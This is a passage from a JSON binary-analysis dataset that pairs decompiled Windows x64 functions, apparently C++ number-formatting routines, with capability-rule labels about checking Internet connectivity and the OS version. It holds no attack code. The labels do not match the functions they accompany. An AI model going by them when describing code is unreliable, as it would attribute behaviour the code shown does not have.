code_r0x00014005d720;\n        iVar12 = *(arg4 + 0x10);\n        arg4_01 = puVar7 + -1;\n        iVar11 = iVar5 + 1;\n        *arg4_01 = *(iVar6 + 0x4b);\n        if (iVar12 <= iVar11) goto code_r0x00014005d72c;\n    }\n    *(puVar9 + -8) = 0x14005d798;\n    iVar6 = fcn.1400147b0(arg1_00);\n    iVar6 = -iVar6;\n    *(puVar9 + iVar6 + 0x28) = iVar11;\n    iVar11 = iVar12;\n    *(puVar9 + iVar6 + 0x20) = iVar12;\n    *(puVar9 + iVar6 + -8) = 0x14005d7c1;\n    fcn.1400a2100(arg4, uStack92, puVar9 + iVar6 + 0x30, arg4_01);\n    arg4_01 = puVar9 + iVar6 + 0x30;\n    puVar9 = puVar9 + iVar6;\ncode_r0x00014005d72c:\n    *(arg4 + 0x10) = 0;\n    cVar8 = piVar3;\n    if (cVar8 == '\\0') {\n        pcVar4 = *(*piVar2 + 0x60);\n        *(puVar9 + -8) = 0x14005d748;\n        iVar6 = (*pcVar4)(piVar2, arg4_01, iVar11);\n        if (iVar11 != iVar6) {\n            cVar8 = '\\x01';\n        }\n    }\n    *arg1 = piVar2;\n    *(arg1 + 1) = cVar8;\n    return arg1;\n}\n",
        "token_count": 1837
    },
    "14005d8a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t **\nfcn.14005d8a0(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t arg4, ulong noname_4, ulong noname_5, \n             ulong noname_6, ulong noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n             ulong arg_70h, ulong arg_78h)\n\n{\n    uint32_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    code *pcVar4;\n    ulong arg4_00;\n    ulong arg3_00;\n    int32_t iVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    uint64_t arg1_00;\n    uchar *puVar8;\n    uchar *puVar9;\n    char cVar10;\n    uchar *puVar11;\n    uchar *puVar12;\n    int64_t iVar13;\n    ulong var_8h_2;\n    ulong uStack176;\n    uchar auStack168 [24];\n    ulong uStack144;\n    uint32_t uStack136;\n    ulong uStack128;\n    uchar auStack120 [20];\n    uchar auStack100 [16];\n    uint32_t uStack84;\n    uint uStack80;\n    char cStack73;\n    ulong var_8h;\n    \n    piVar2 = *arg3;\n    piVar3 = arg3[1];\n    uStack80 = noname_4;\n    uStack144 = 0x14005d8d4;\n    iVar6 = fcn.140026e80(arg4 + 0xd0);\n    uVar1 = *(arg4 + 0x18);\n    puVar11 = &stack0xffffffffffffff58;\n    puVar12 = &stack0xffffffffffffff58;\n    uStack84 = uVar1 & 0x4a;\n    cStack73 = uStack84 != 0x40 && uStack84 != 8;\n    uStack136 = cStack73;\n    uStack176 = 0x14005d91d;\n    iVar5 = fcn.1400b5d80(&stack0xffffffffffffff9c, noname_5, iVar6 + 0x4a, uVar1);\n    arg1_00 = iVar5;\n    puVar8 = &stack0xffffffffffffff88 + (0x14 - iVar5);\n    if (*(iVar6 + 0x20) != '\\0') {\n        uStack176 = 0x14005d9ab;\n        iVar13 = fcn.1400147b0(arg1_00);\n        arg4_00 = *(iVar6 + 0x18);\n        arg3_00 = *(iVar6 + 0x10);\n        iVar13 = -iVar13;\n        puVar11 = &stack0xffffffffffffff58 + iVar13;\n        puVar12 = &stack0xffffffffffffff58 + iVar13;\n        cVar10 = *(iVar6 + 0x49);\n        *(&stack0xffffffffffffff80 + iVar13) = puVar8 + arg1_00;\n        puVar9 = &stack0xffffffffffffff8a + iVar13;\n        *(&stack0xffffffffffffff78 + iVar13) = puVar8;\n        *(&stack0xffffffffffffff50 + iVar13) = 0x14005d9d7;\n        iVar5 = fcn.1400b60e0(puVar9, cVar10, arg3_00, arg4_00);\n        arg1_00 = iVar5 - puVar9;\n        puVar8 = puVar9;\n    }\n    puVar9 = puVar8;\n    if (((cStack73 == '\\0') && (puVar11 = puVar12,  (uVar1 & 0x200) != 0)) && (noname_5 != 0)) {\n        if (uStack84 == 0x40) {\n            arg1_00 = arg1_00 + 1;\n            puVar9 = puVar8 + -1;\n            *puVar9 = *(iVar6 + 0x4e);\n        }\n        else {\n            arg1_00 = arg1_00 + 2;\n            puVar9 = puVar8 + -2;\n            puVar8[-1] = *(iVar6 + 0x4c + (uVar1 >> 0xe & 1));\n            *puVar9 = *(iVar6 + 0x4e);\n        }\n    }\n    iVar6 = *(arg4 + 0x10);\n    iVar13 = arg1_00;\n    puVar8 = puVar9;\n    puVar12 = puVar11;\n    if (iVar13 < iVar6) {\n        *(puVar11 + -8) = 0x14005da3d;\n        iVar7 = fcn.1400147b0(arg1_00);\n        iVar7 = -iVar7;\n        puVar12 = puVar11 + iVar7;\n        *(puVar11 + iVar7 + 0x28) = iVar13;\n        puVar8 = puVar11 + iVar7 + 0x30;\n        iVar13 = iVar6;\n        *(puVar11 + iVar7 + 0x20) = iVar6;\n        *(puVar11 + iVar7 + -8) = 0x14005da66;\n        fcn.1400a2100(arg4, uStack80, puVar8, puVar9);\n    }\n    *(arg4 + 0x10) = 0;\n    cVar10 = piVar3;\n    if (cVar10 == '\\0') {\n        pcVar4 = *(*piVar2 + 0x60);\n        *(puVar12 + -8) = 0x14005d96e;\n        iVar6 = (*pcVar4)(piVar2, puVar8, iVar13);\n        if (iVar13 != iVar6) {\n            cVar10 = '\\x01';\n        }\n    }\n    *arg1 = piVar2;\n    *(arg1 + 1) = cVar10;\n    return arg1;\n}\n",
        "token_count": 1369
    },
    "14005da9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t **\nfcn.14005da90(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t arg4, ulong noname_4, int64_t noname_5, \n             ulong noname_6, ulong noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n             ulong arg_70h, ulong arg_78h)\n\n{\n    uint32_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    code *pcVar4;\n    ulong arg4_00;\n    ulong arg3_00;\n    int32_t iVar5;\n    int64_t iVar6;\n    uchar *arg1_00;\n    uchar *puVar7;\n    uchar *arg4_01;\n    char cVar8;\n    uchar *puVar9;\n    uchar *puVar10;\n    int64_t iVar11;\n    int64_t iVar12;\n    bool bVar13;\n    bool bVar14;\n    ulong var_8h_2;\n    ulong uStack208;\n    uchar auStack200 [32];\n    uint32_t uStack168;\n    ulong uStack160;\n    uchar auStack152 [2];\n    uchar auStack150 [38];\n    uchar auStack112 [16];\n    uint32_t uStack96;\n    uint uStack92;\n    uchar *puStack88;\n    ulong uStack80;\n    ulong var_14h;\n    ulong var_8h;\n    \n    puStack88 = &stack0xffffffffffffff68;\n    piVar2 = *arg3;\n    piVar3 = arg3[1];\n    uStack92 = noname_4;\n    uStack160 = 0x14005dac8;\n    iVar6 = fcn.140026e80(arg4 + 0xd0);\n    uVar1 = *(arg4 + 0x18);\n    puVar9 = &stack0xffffffffffffff38;\n    puVar10 = &stack0xffffffffffffff38;\n    uStack96 = uVar1 & 0x4a;\n    bVar13 = uStack96 != 0x40;\n    bVar14 = uStack96 != 8;\n    iVar12 = noname_5;\n    if ((noname_5 < 1) && (iVar12 = -noname_5,  !bVar13 || !bVar14)) {\n        iVar12 = noname_5;\n    }\n    arg1_00 = &stack0xffffffffffffff90;\n    uStack168 = bVar13 && bVar14;\n    uStack80 = CONCAT44(uStack80._4_4_, uVar1);\n    uStack208 = 0x14005db23;\n    iVar5 = fcn.1400b5e40(arg1_00, iVar12, iVar6 + 0x4a, uVar1);\n    iVar12 = iVar5;\n    puVar7 = puStack88 + (0x28 - iVar5);\n    if (*(iVar6 + 0x20) == '\\0') {\n        if (bVar13 && bVar14) goto code_r0x00014005db4f;\ncode_r0x00014005dc8b:\n        arg4_01 = puVar7;\n        if (((uStack80 & 0x200) != 0) && (noname_5 != 0)) {\n            if (uStack96 == 0x40) {\n                iVar5 = iVar5 + 1;\n                arg4_01 = puVar7 + -1;\n                *arg4_01 = *(iVar6 + 0x4e);\n            }\n            else {\n                iVar5 = iVar5 + 2;\n                arg4_01 = puVar7 + -2;\n                puVar7[-1] = *(iVar6 + 0x4c + (uStack80 >> 0xe & 1));\n                *arg4_01 = *(iVar6 + 0x4e);\n            }\n        }\ncode_r0x00014005db61:\n        iVar12 = *(arg4 + 0x10);\n        iVar11 = iVar5;\n        puVar9 = puVar10;\n        if (iVar12 <= iVar11) goto code_r0x00014005db6d;\n    }\n    else {\n        puStack88 = puStack88 & 0xffffffff00000000 | uStack80 & 0xffffffff;\n        uStack208 = 0x14005dc40;\n        iVar11 = fcn.1400147b0(arg1_00);\n        cVar8 = *(iVar6 + 0x49);\n        arg4_00 = *(iVar6 + 0x18);\n        iVar11 = -iVar11;\n        puVar9 = &stack0xffffffffffffff38 + iVar11;\n        puVar10 = &stack0xffffffffffffff38 + iVar11;\n        arg3_00 = *(iVar6 + 0x10);\n        *(&stack0xffffffffffffff60 + iVar11) = puVar7 + iVar12;\n        *(&stack0xffffffffffffff58 + iVar11) = puVar7;\n        uStack80 = &stack0xffffffffffffff6a + iVar11;\n        *(&stack0xffffffffffffff30 + iVar11) = 0x14005dc71;\n        iVar5 = fcn.1400b60e0(&stack0xffffffffffffff6a + iVar11, cVar8, arg3_00, arg4_00);\n        iVar5 = iVar5 - uStack80;\n        arg1_00 = uStack80;\n        puVar7 = uStack80;\n        uStack80._0_4_ = puStack88;\n        if (!bVar13 || !bVar14) goto code_r0x00014005dc8b;\ncode_r0x00014005db4f:\n        puVar10 = puVar9;\n        if (noname_5 < 0) {\n            iVar5 = iVar5 + 1;\n            puVar7[-1] = *(iVar6 + 0x4a);\n            arg4_01 = puVar7 + -1;\n            goto code_r0x00014005db61;\n        }\n        arg4_01 = puVar7;\n        if ((uStack80 & 0x800) == 0) goto code_r0x00014005db61;\n        iVar12 = *(arg4 + 0x10);\n        arg4_01 = puVar7 + -1;\n        iVar11 = iVar5 + 1;\n        *arg4_01 = *(iVar6 + 0x4b);\n        if (iVar12 <= iVar11) goto code_r0x00014005db6d;\n    }\n    *(puVar9 + -8) = 0x14005dbd8;\n    iVar6 = fcn.1400147b0(arg1_00);\n    iVar6 = -iVar6;\n    *(puVar9 + iVar6 + 0x28) = iVar11;\n    iVar11 = iVar12;\n    *(puVar9 + iVar6 + 0x20) = iVar12;\n    *(puVar9 + iVar6 + -8) = 0x14005dc01;\n    fcn.1400a2100(arg4, uStack92, puVar9 + iVar6 + 0x30, arg4_01);\n    arg4_01 = puVar9 + iVar6 + 0x30;\n    puVar9 = puVar9 + iVar6;\ncode_r0x00014005db6d:\n    *(arg4 + 0x10) = 0;\n    cVar8 = piVar3;\n    if (cVar8 == '\\0') {\n        pcVar4 = *(*piVar2 + 0x60);\n        *(puVar9 + -8) = 0x14005db89;\n        iVar12 = (*pcVar4)(piVar2, arg4_01, iVar11);\n        if (iVar11 != iVar12) {\n            cVar8 = '\\x01';\n        }\n    }\n    *arg1 = piVar2;\n    *(arg1 + 1) = cVar8;\n    return arg1;\n}\n",
        "token_count": 1822
    },
    "14005dce": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t **\nfcn.14005dce0(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t arg4, ulong noname_4, int64_t noname_5, \n             ulong noname_6, ulong noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n             ulong arg_70h, ulong arg_78h)\n\n{\n    uint32_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    code *pcVar4;\n    ulong arg4_00;\n    ulong arg3_00;\n    int32_t iVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    uint64_t arg1_00;\n    uchar *puVar8;\n    uchar *puVar9;\n    char cVar10;\n    uchar *puVar11;\n    uchar *puVar12;\n    int64_t iVar13;\n    ulong var_8h_2;\n    ulong uStack192;\n    uchar auStack184 [32];\n    uint32_t uStack152;\n    ulong uStack144;\n    uchar auStack136 [40];\n    uchar auStack96 [12];\n    uint32_t uStack84;\n    uint uStack80;\n    char cStack73;\n    ulong var_8h;\n    \n    piVar2 = *arg3;\n    piVar3 = arg3[1];\n    uStack80 = noname_4;\n    uStack144 = 0x14005dd14;\n    iVar6 = fcn.140026e80(arg4 + 0xd0);\n    uVar1 = *(arg4 + 0x18);\n    puVar11 = &stack0xffffffffffffff48;\n    puVar12 = &stack0xffffffffffffff48;\n    uStack84 = uVar1 & 0x4a;\n    cStack73 = uStack84 != 0x40 && uStack84 != 8;\n    uStack152 = cStack73;\n    uStack192 = 0x14005dd5e;\n    iVar5 = fcn.1400b5e40(&stack0xffffffffffffffa0, noname_5, iVar6 + 0x4a, uVar1);\n    arg1_00 = iVar5;\n    puVar8 = &stack0xffffffffffffff78 + (0x28 - iVar5);\n    if (*(iVar6 + 0x20) != '\\0') {\n        uStack192 = 0x14005ddeb;\n        iVar13 = fcn.1400147b0(arg1_00);\n        arg4_00 = *(iVar6 + 0x18);\n        arg3_00 = *(iVar6 + 0x10);\n        iVar13 = -iVar13;\n        puVar11 = &stack0xffffffffffffff48 + iVar13;\n        puVar12 = &stack0xffffffffffffff48 + iVar13;\n        cVar10 = *(iVar6 + 0x49);\n        *(&stack0xffffffffffffff70 + iVar13) = puVar8 + arg1_00;\n        puVar9 = &stack0xffffffffffffff7a + iVar13;\n        *(&stack0xffffffffffffff68 + iVar13) = puVar8;\n        *(&stack0xffffffffffffff40 + iVar13) = 0x14005de17;\n        iVar5 = fcn.1400b60e0(puVar9, cVar10, arg3_00, arg4_00);\n        arg1_00 = iVar5 - puVar9;\n        puVar8 = puVar9;\n    }\n    puVar9 = puVar8;\n    if (((cStack73 == '\\0') && (puVar11 = puVar12,  (uVar1 & 0x200) != 0)) && (noname_5 != 0)) {\n        if (uStack84 == 0x40) {\n            arg1_00 = arg1_00 + 1;\n            puVar9 = puVar8 + -1;\n            *puVar9 = *(iVar6 + 0x4e);\n        }\n        else {\n            arg1_00 = arg1_00 + 2;\n            puVar9 = puVar8 + -2;\n            puVar8[-1] = *(iVar6 + 0x4c + (uVar1 >> 0xe & 1));\n            *puVar9 = *(iVar6 + 0x4e);\n        }\n    }\n    iVar6 = *(arg4 + 0x10);\n    iVar13 = arg1_00;\n    puVar8 = puVar9;\n    puVar12 = puVar11;\n    if (iVar13 < iVar6) {\n        *(puVar11 + -8) = 0x14005de7d;\n        iVar7 = fcn.1400147b0(arg1_00);\n        iVar7 = -iVar7;\n        puVar12 = puVar11 + iVar7;\n        *(puVar11 + iVar7 + 0x28) = iVar13;\n        puVar8 = puVar11 + iVar7 + 0x30;\n        iVar13 = iVar6;\n        *(puVar11 + iVar7 + 0x20) = iVar6;\n        *(puVar11 + iVar7 + -8) = 0x14005dea6;\n        fcn.1400a2100(arg4, uStack80, puVar8, puVar9);\n    }\n    *(arg4 + 0x10) = 0;\n    cVar10 = piVar3;\n    if (cVar10 == '\\0') {\n        pcVar4 = *(*piVar2 + 0x60);\n        *(puVar12 + -8) = 0x14005ddaf;\n        iVar6 = (*pcVar4)(piVar2, puVar8, iVar13);\n        if (iVar13 != iVar6) {\n            cVar10 = '\\x01';\n        }\n    }\n    *arg1 = piVar2;\n    *(arg1 + 1) = cVar10;\n    return arg1;\n}\n",
        "token_count": 1358
    },
    "14005dfa": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.14005dfa0(int64_t **arg1, int64_t *arg2, int64_t **arg3, int64_t arg4, ulong noname_4, ulong noname_5, \n                  int64_t noname_6, ulong noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n                  ulong noname_12, ulong noname_13, ulong arg_80h, ulong arg_88h, ulong arg_90h)\n\n{\n    code *pcVar1;\n    int64_t arg2_00;\n    int32_t iVar2;\n    int64_t *arg1_00;\n    char *pcVar3;\n    int64_t iVar4;\n    uint32_t uVar5;\n    int64_t *piVar6;\n    uchar *puVar7;\n    char cVar8;\n    uchar *puVar9;\n    uchar *puVar10;\n    uchar *puVar11;\n    int64_t *piVar12;\n    int64_t *piVar13;\n    int64_t iVar14;\n    int64_t *piVar15;\n    int64_t iVar16;\n    bool bVar17;\n    ulong var_18h_2;\n    ulong var_60h;\n    ulong var_68h;\n    ulong uStack288;\n    uchar auStack280 [32];\n    int64_t aiStack248 [11];\n    int64_t *piStack160;\n    uint uStack148;\n    int64_t *piStack144;\n    int64_t *piStack136;\n    int64_t *piStack128;\n    int32_t iStack116;\n    ulong uStack112;\n    uchar auStack104 [24];\n    ulong var_48h;\n    ulong var_38h;\n    ulong var_30h;\n    ulong var_28h;\n    ulong var_18h;\n    ulong var_10h;\n    \n    piStack128 = *arg3;\n    piStack144 = arg3[1];\n    piVar6 = arg4 + 0xd0;\n    uStack148 = noname_4;\n    aiStack248[1] = 0x14005e003;\n    piStack136 = fcn.140026e80(piVar6);\n    iVar14 = *(arg4 + 8);\n    if (iVar14 < 0) {\n        iVar14 = 6;\n    }\n    aiStack248[1] = 0x14005e026;\n    fcn.14007eab0(arg4, &stack0xffffffffffffff98);\n    puVar9 = &stack0xfffffffffffffee8;\n    piVar12 = &stack0xffffffffffffff28;\n    if ((*(arg4 + 0x18) & 0x104) == 0x104) {\n        uStack288 = 0x14005e2b5;\n        aiStack248[0] = noname_6;\n        uStack112 = fcn.1400a5680();\n        uStack288 = 0x14005e2d7;\n        puVar7 = &stack0xffffffffffffff90;\n        iVar14 = aiStack248[0];\n        iVar2 = fcn.1400b66d0(&stack0xffffffffffffff90, piVar12, 0x2d, &stack0xffffffffffffff98);\n        iStack116 = iVar2;\n        if (0x2c < iVar2) {\n            uStack288 = 0x14005e2f8;\n            iVar16 = fcn.1400147b0(puVar7);\n            iVar16 = -iVar16;\n            puVar9 = &stack0xfffffffffffffee8 + iVar16;\n            *(&stack0xfffffffffffffee0 + iVar16) = 0x14005e300;\n            uStack112 = fcn.1400a5680();\n            piVar12 = &stack0xffffffffffffff28 + iVar16;\n            *(&stack0xffffffffffffff08 + iVar16) = iVar14;\n            *(&stack0xfffffffffffffee0 + iVar16) = 0x14005e320;\n            iStack116 = fcn.1400b66d0(&stack0xffffffffffffff90, piVar12, iVar2 + 1, &stack0xffffffffffffff98);\n        }\n    }\n    else {\n        uStack288 = 0x14005e047;\n        iVar16 = noname_6;\n        uStack112 = fcn.1400a5680();\n        aiStack248[1] = iVar16;\n        uStack288 = 0x14005e06e;\n        puVar7 = &stack0xffffffffffffff90;\n        aiStack248[0] = iVar14;\n        iVar16 = aiStack248[1];\n        iVar2 = fcn.1400b66d0(&stack0xffffffffffffff90, piVar12, 0x2d, &stack0xffffffffffffff98);\n        iStack116 = iVar2;\n        puVar9 = &stack0xfffffffffffffee8;\n        if (0x2c < iVar2) {\n            uStack288 = 0x14005e193;\n            iVar4 = fcn.1400147b0(puVar7);\n            iVar4 = -iVar4;\n            puVar9 = &stack0xfffffffffffffee8 + iVar4;\n            *(&stack0xfffffffffffffee0 + iVar4) = 0x14005e19b;\n            uStack112 = fcn.1400a5680();\n            piVar12 = &stack0xffffffffffffff28 + iVar4;\n            *(&stack0xffffffffffffff08 + iVar4) = iVar14;\n            *(&stack0xffffffffffffff10 + iVar4) = iVar16;\n            *(&stack0xfffffffffffffee0 + iVar4) = 0x14005e1c0;\n            iStack116 = fcn.1400b66d0(&stack0xffffffffffffff90, piVar12, iVar2 + 1, &stack0xffffffffffffff98);\n        }\n    }\n    iVar2 = iStack116;\n    iVar16 = iStack116;\n    *(puVar9 + -8) = 0x14005e087;\n    arg1_00 = fcn.1400b97f0(piVar6);\n    *(puVar9 + -8) = 0x14005e097;\n    iVar14 = fcn.1400147b0(piVar6);\n    iVar14 = -iVar14;\n    puVar10 = puVar9 + iVar14;\n    puVar11 = puVar9 + iVar14;\n    piVar13 = piVar12 + iVar16;\n    piVar15 = puVar9 + iVar14 + 0x40;\n    if (*(arg1_00 + 7) == '\\x01') {\ncode_r0x00014005e0ce:\n        arg1_00 = piVar6;\n        if (piVar13 != piVar12) {\n            *(puVar9 + iVar14 + -8) = 0x14005e0e1;\n            arg1_00 = piVar15;\n            sub.msvcrt.dll_memcpy(piVar15, piVar12, iVar16);\n        }\n    }\n    else {\n        if (*(arg1_00 + 7) == '\\0') {\n            piStack160 = piVar13;\n            *(puVar9 + iVar14 + -8) = 0x14005e33c;\n            piVar6 = arg1_00;\n            fcn.14002b2c0(arg1_00);\n            piVar13 = piStack160;\n        }\n        pcVar1 = *(*arg1_00 + 0x38);\n        if (pcVar1 == 0x14002ba80) goto code_r0x00014005e0ce;\n        *(puVar9 + iVar14 + -8) = 0x14005e3ab;\n        (*pcVar1)();\n    }\n    if (iVar16 == 0) {\n        if (*(piStack136 + 4) == '\\0') goto code_r0x00014005e120;\n        pcVar3 = NULL;\ncode_r0x00014005e1e0:\n        *(puVar9 + iVar14 + -8) = 0x14005e1ee;\n        iVar16 = fcn.1400147b0(arg1_00);\n        iVar16 = -iVar16;\n        puVar11 = puVar9 + iVar16 + iVar14;\n        puVar10 = puVar9 + iVar16 + iVar14;\n        piVar6 = puVar9 + iVar16 + iVar14 + 0x40;\n        bVar17 = (*piVar12 - 0x2bU & 0xfd) == 0;\n        piVar12 = piVar6;\n        if (bVar17) {\n            cVar8 = *piVar15;\n            piVar15 = puVar9 + iVar14 + 0x41;\n            iStack116 = iVar2 + -1;\n            *piVar6 = cVar8;\n            piVar12 = puVar9 + iVar16 + iVar14 + 0x41;\n        }\n        iVar4 = piStack136[3];\n        arg2_00 = piStack136[2];\n        *(puVar9 + iVar16 + iVar14 + 0x30) = piVar15;\n        *(puVar9 + iVar16 + iVar14 + 0x20) = pcVar3;\n        *(puVar9 + iVar16 + iVar14 + 0x38) = &stack0xffffffffffffff8c;\n        *(puVar9 + iVar16 + iVar14 + 0x28) = piVar12;\n        *(puVar9 + iVar16 + iVar14 + -8) = 0x14005e258;\n        fcn.14005ded0(arg2, arg2_00, iVar4);\n        iStack116 = bVar17 + iStack116;\n        iVar14 = *(arg4 + 0x10);\n        iVar16 = iStack116;\n        if (iVar14 <= iVar16) goto code_r0x00014005e12d;\n    }\n    else {\n        *(puVar9 + iVar14 + -8) = 0x14005e0fa;\n        arg1_00 = piVar12;\n        pcVar3 = sub.msvcrt.dll_memchr(piVar12, 0x2e, iVar16);\n        piVar6 = piStack136;\n        if (pcVar3 != NULL) {\n            pcVar3 = (pcVar3 - piVar12) + piVar15;\n            *pcVar3 = *(piStack136 + 9);\n            arg1_00 = piVar6;\n            if (*(piVar6 + 4) == '\\0') goto code_r0x00014005e120;\n            goto code_r0x00014005e1e0;\n        }\n        if ((*(piStack136 + 4) != '\\0') &&\n           ((iVar2 < 3 ||\n            (((*(piVar12 + 1) < ':' && (uVar5 = *(piVar12 + 2) - 0x30,  arg1_00 = uVar5,  uVar5 < 10)) &&\n             ('/' < *(piVar12 + 1))))))) goto code_r0x00014005e1e0;\ncode_r0x00014005e120:\n        iVar14 = *(arg4 + 0x10);\n        arg2 = arg1_00;\n        piVar6 = piVar15;\n        if (iVar14 <= iVar16) goto code_r0x00014005e12d;\n    }\n    *(puVar11 + -8) = 0x14005e27b;\n    iVar4 = fcn.1400147b0(arg2);\n    iVar4 = -iVar4;\n    puVar10 = puVar11 + iVar4;\n    *(puVar11 + iVar4 + 0x28) = iVar16;\n    iVar16 = iVar14;\n    *(puVar11 + iVar4 + 0x20) = iVar14;\n    *(puVar11 + iVar4 + -8) = 0x14005e2a5;\n    fcn.1400a2100(arg4, uStack148, puVar11 + iVar4 + 0x40, piVar6);\n    iStack116 = iVar14;\n    piVar6 = puVar11 + iVar4 + 0x40;\ncode_r0x00014005e12d:\n    piVar12 = piStack128;\n    *(arg4 + 0x10) = 0;\n    cVar8 = piStack144;\n    if (cVar8 == '\\0') {\n        pcVar1 = *(*piStack128 + 0x60);\n        *(puVar10 + -8) = 0x14005e14f;\n        iVar14 = (*pcVar1)(piVar12, piVar6, iVar16);\n        if (iVar14 != iVar16) {\n            cVar8 = '\\x01';\n        }\n    }\n    *arg1 = piStack128;\n    *(arg1 + 1) = cVar8;\n    return;\n}\n",
        "token_count": 2944
    },
    "14005e3b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.14005e3b0(int64_t **arg1, int64_t *arg2, int64_t **arg3, int64_t arg4, ulong noname_4, ulong noname_5, \n                  unkbyte10 *noname_6, ulong noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11\n                  , ulong arg_70h, ulong arg_78h, ulong arg_80h)\n\n{\n    code *pcVar1;\n    int64_t arg2_00;\n    int32_t iVar2;\n    int64_t *arg1_00;\n    int64_t iVar3;\n    char *pcVar4;\n    int64_t iVar5;\n    uint32_t uVar6;\n    int64_t *piVar7;\n    ulong *puVar8;\n    char cVar9;\n    uchar *puVar10;\n    uchar *puVar11;\n    uchar *puVar12;\n    int64_t *piVar13;\n    uchar *puVar14;\n    int64_t *piVar15;\n    int64_t iVar16;\n    bool bVar17;\n    ulong var_8h;\n    ulong var_50h;\n    ulong var_58h_2;\n    ulong uStack320;\n    uchar auStack312 [32];\n    uchar *apuStack280 [4];\n    int64_t aiStack248 [9];\n    ulong *puStack176;\n    uint uStack164;\n    int64_t *piStack160;\n    uchar auStack152 [16];\n    int64_t *piStack136;\n    int64_t *piStack128;\n    uchar auStack120 [8];\n    ulong var_68h;\n    int32_t var_5ch;\n    ulong var_58h;\n    ulong var_50h_2;\n    ulong var_40h;\n    ulong var_38h;\n    ulong var_30h;\n    ulong var_18h;\n    ulong var_10h;\n    \n    piVar13 = &stack0xffffffffffffff08;\n    piStack128 = *arg3;\n    piStack160 = arg3[1];\n    piVar7 = arg4 + 0xd0;\n    uStack164 = noname_4;\n    auStack152._0_10_ = *noname_6;\n    apuStack280[3] = 0x14005e40d;\n    piStack136 = fcn.140026e80(piVar7);\n    puVar14 = *(arg4 + 8);\n    if (puVar14 < 0) {\n        puVar14 = 0x6;\n    }\n    apuStack280[3] = 0x14005e430;\n    fcn.14007eab0(arg4, &fcn.14005e3b0::var_50h_2);\n    puVar10 = &stack0xfffffffffffffec8;\n    if ((*(arg4 + 0x18) & 0x104) == 0x104) {\n        uStack320 = 0x14005e6d5;\n        var_58h = fcn.1400a5680();\n        _auStack120 = auStack152._0_10_;\n        uStack320 = 0x14005e700;\n        puVar8 = &fcn.14005e3b0::var_58h;\n        apuStack280[0] = &stack0xffffffffffffff88;\n        iVar2 = fcn.1400b66d0(&fcn.14005e3b0::var_58h, &stack0xffffffffffffff08, 0x36, &fcn.14005e3b0::var_50h_2);\n        var_5ch = iVar2;\n        if (0x35 < iVar2) {\n            uStack320 = 0x14005e723;\n            iVar3 = fcn.1400147b0(puVar8);\n            iVar3 = -iVar3;\n            puVar10 = &stack0xfffffffffffffec8 + iVar3;\n            *(&stack0xfffffffffffffec0 + iVar3) = 0x14005e72b;\n            var_58h = fcn.1400a5680();\n            piVar13 = &stack0xffffffffffffff08 + iVar3;\n            _auStack120 = auStack152._0_10_;\n            *(&stack0xfffffffffffffee8 + iVar3) = &stack0xffffffffffffff88;\n            *(&stack0xfffffffffffffec0 + iVar3) = 0x14005e750;\n            var_5ch = fcn.1400b66d0(&fcn.14005e3b0::var_58h, piVar13, iVar2 + 1, &fcn.14005e3b0::var_50h_2);\n        }\n    }\n    else {\n        uStack320 = 0x14005e451;\n        var_58h = fcn.1400a5680();\n        puVar8 = &fcn.14005e3b0::var_58h;\n        _auStack120 = auStack152._0_10_;\n        uStack320 = 0x14005e485;\n        apuStack280[0] = puVar14;\n        apuStack280[1] = &stack0xffffffffffffff88;\n        puStack176 = puVar8;\n        iVar2 = fcn.1400b66d0(puVar8, &stack0xffffffffffffff08, 0x36, &fcn.14005e3b0::var_50h_2);\n        var_5ch = iVar2;\n        puVar10 = &stack0xfffffffffffffec8;\n        piVar13 = 